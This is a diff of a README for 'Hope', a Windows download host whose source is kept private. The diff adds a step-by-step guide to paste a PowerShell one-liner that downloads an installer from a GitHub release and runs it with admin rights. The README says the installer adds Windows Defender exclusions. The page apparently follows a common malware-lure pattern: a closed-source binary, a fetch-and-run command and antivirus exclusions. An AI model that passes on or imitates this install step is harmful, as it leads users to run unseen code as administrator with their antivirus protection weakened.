@@ -2,10 +2,38 @@
 
 Download host for Hope. The source lives in a separate private repository.
 
-Installers are attached to each release. Grab the newest one and run it:
+## How to Install
 
-    powershell -Command "irm <release-asset-url> -OutFile $env:TEMP\HopeSetup.exe; Start-Process $env:TEMP\HopeSetup.exe"
+Get Hope running on Windows in under 30 seconds. Install with one command.
 
-Windows x64, administrator required (one prompt). The installer adds a Desktop
-shortcut, registers an uninstaller and adds a Windows Defender exclusion for its
-own folder.
+### 1 — Open Command Prompt
+
+Press **Win + R**, type `cmd`, and hit Enter. Or search for "Command Prompt" in the Start menu.
+
+### 2 — Paste the Command
+
+Copy the command below and paste it into your Command Prompt window. Right-click to paste.
+
+### 3 — Press Enter & Done!
+
+Hit **Enter**. The Hope installer downloads, asks for admin permission, and installs itself. A Hope shortcut appears on your Desktop when it's done.
+
+```cmd
+C:\> powershell -Command "irm https://github.com/muleimm/h-releases/releases/download/v1.1.8/HopeSetup-1.1.8.exe -OutFile $env:TEMP\HopeSetup-1.1.8.exe; Start-Process $env:TEMP\HopeSetup-1.1.8.exe"
+```
+
+> **What happens when you run this?**
+>
+> → Downloads the Hope installer automatically
+> → One admin prompt, that's it
+> → Adds Windows Defender exclusions for you
+> → Desktop shortcut when it's done
+
+## Details
+
+- **Requirements:** Windows 10/11 (64-bit). No prerequisites — the installer adds the browser runtime silently if it is missing.
+- **Install location:** `C:\Program Files\Hope`
+- **Uninstall:** *Settings → Apps → Hope 1.1.8 → Uninstall*, or run `C:\Program Files\Hope\unins000.exe`.
+- **Verify your download:** SHA-256 of `HopeSetup-1.1.8.exe` — `D2E3BB7D8B71D280F2D4690B4C55F83C7244C606FE0C73BA9F77C6EC2FC33B7D`
+
+Latest release: [v1.1.8](https://github.com/muleimm/h-releases/releases/tag/v1.1.8)
